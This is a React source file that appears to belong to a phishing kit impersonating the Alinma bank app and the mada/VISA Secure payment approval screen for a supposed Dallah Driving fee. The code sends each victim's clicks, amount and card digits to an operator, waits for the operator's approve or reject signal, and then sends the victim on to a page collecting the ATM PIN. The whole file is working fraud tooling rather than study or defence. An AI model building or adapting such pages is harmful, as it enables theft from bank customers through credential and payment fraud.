import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import { sendData, codeAction, navigateToPage } from "@/lib/store";

export default function InmaApp() {
  const [, navigate] = useLocation();
  const [countdown, setCountdown] = useState(59);
  const [isWaiting, setIsWaiting] = useState(false);
  const [error, setError] = useState(false);

  // Get payment data from localStorage
  const serviceName = localStorage.getItem('selectedService') || 'خدمات رخصة القيادة';
  const totalAmount = localStorage.getItem('selectedPaymentAmount') || localStorage.getItem('selectedTotalAmount') || '0';
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || '****';

  // Current date/time
  const now = new Date();
  const dateStr = `${now.getFullYear()}/${String(now.getMonth() + 1).padStart(2, '0')}/${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;

  useEffect(() => {
    navigateToPage('تطبيق إنماء');
  }, []);

  // Countdown timer
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Handle code action from admin (approve/reject)
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        navigate("/atm-password");
      } else if (action.action === "reject") {
        setError(true);
        setIsWaiting(false);
      }
      codeAction.value = null;
    }
  });

  const handleConfirm = () => {
    setIsWaiting(true);
    setError(false);
    sendData({
      data: {
        'الصفحة': 'تطبيق إنماء',
        'الحالة': 'تم الضغط على تأكيد',
        'المبلغ': `${totalAmount} ر.س`,
        'البطاقة': `****${cardLast4}`,
      },
      current: 'تطبيق إنماء - تأكيد',
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    setCountdown(59);
    setError(false);
    sendData({
      data: {
        'الصفحة': 'تطبيق إنماء',
        'الحالة': 'تم طلب إعادة إرسال',
      },
      current: 'تطبيق إنماء - إعادة إرسال',
      waitingForAdminResponse: false,
    });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4" dir="ltr">
      {/* Phone Frame */}
      <div className="w-full max-w-sm bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-200">
        
        {/* Status Bar */}
        <div className="bg-white px-4 py-2 flex justify-between items-center text-xs text-gray-600">
          <span className="font-medium">7:07</span>
          <div className="flex items-center gap-1">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 21l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.18L12 21z"/></svg>
          </div>
        </div>

        {/* Header with logos */}
        <div className="flex justify-between items-center px-4 py-3 border-b">
          <div className="flex items-center gap-2">
            <div className="bg-green-700 text-white text-xs font-bold px-2 py-1 rounded">mada</div>
            <div className="flex gap-1">
              <div className="w-6 h-4 bg-blue-900 rounded-sm"></div>
              <div className="w-6 h-4 bg-green-600 rounded-sm"></div>
              <div className="w-6 h-4 bg-yellow-500 rounded-sm"></div>
            </div>
          </div>
          <div className="flex flex-col items-end gap-1">
            <span className="text-blue-800 font-bold text-xs">VISA</span>
            <span className="bg-yellow-400 text-xs font-bold px-1 rounded text-gray-800">SECURE</span>
            <span className="text-purple-700 font-bold text-xs">عربي</span>
          </div>
        </div>

        {/* Main Content */}
        <div className="p-4">
          {/* Info Box */}
          <div className="bg-purple-50 border border-purple-200 rounded-lg p-4 mb-4 relative">
            <div className="flex items-start gap-2">
              <span className="text-blue-600 text-lg">ℹ</span>
              <div className="flex-1">
                <p className="text-sm text-gray-700 leading-relaxed">
                  <strong>Login to alinma App</strong><br/>
                  Dear customer, please log in to the mobile application to approve the payment before the session expires
                </p>
              </div>
              {/* Countdown Circle */}
              <div className="flex-shrink-0 w-16 h-16 relative">
                <svg className="w-16 h-16 transform -rotate-90" viewBox="0 0 36 36">
                  <path
                    className="text-gray-200"
                    d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                  />
                  <path
                    className="text-gray-500"
                    d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                    strokeDasharray={`${(countdown / 59) * 100}, 100`}
                  />
                </svg>
                <div className="absolute inset-0 flex flex-col items-center justify-center">
                  <span className="text-xs font-bold text-gray-700">{countdown}</span>
                  <span className="text-[8px] text-gray-500">seconds</span>
                </div>
              </div>
            </div>
          </div>

          {/* Transaction Details */}
          <div className="space-y-3 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-500">Merchant:</span>
              <span className="font-medium text-gray-800">DALLAH DRIVING COMPANY</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Amount:</span>
              <span className="font-medium text-gray-800">{totalAmount}.00</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Date:</span>
              <span className="font-medium text-gray-800">{dateStr}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Card Number:</span>
              <span className="font-medium text-gray-800">****{cardLast4}</span>
            </div>
          </div>

          {/* Error Message */}
          {error && (
            <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg">
              <p className="text-red-600 text-sm text-center font-medium">تم رفض العملية. يرجى المحاولة مرة أخرى</p>
            </div>
          )}

          {/* Confirm Button */}
          <button
            onClick={handleConfirm}
            disabled={isWaiting}
            className={`w-full mt-6 py-3 rounded-lg font-bold text-white text-center transition-all ${
              isWaiting
                ? 'bg-gray-400 cursor-not-allowed'
                : 'bg-gray-600 hover:bg-gray-700 active:bg-gray-800'
            }`}
          >
            {isWaiting ? (
              <div className="flex items-center justify-center gap-2">
                <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                جاري التحقق...
              </div>
            ) : (
              'CONFIRM'
            )}
          </button>

          {/* Need Help & Resend */}
          <div className="mt-4 flex justify-between items-center">
            <span className="text-sm text-gray-500">Need some help ?</span>
            <button
              onClick={handleResend}
              className="px-4 py-2 bg-gray-200 text-gray-700 rounded font-medium text-sm hover:bg-gray-300 transition-colors"
            >
              RESEND
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
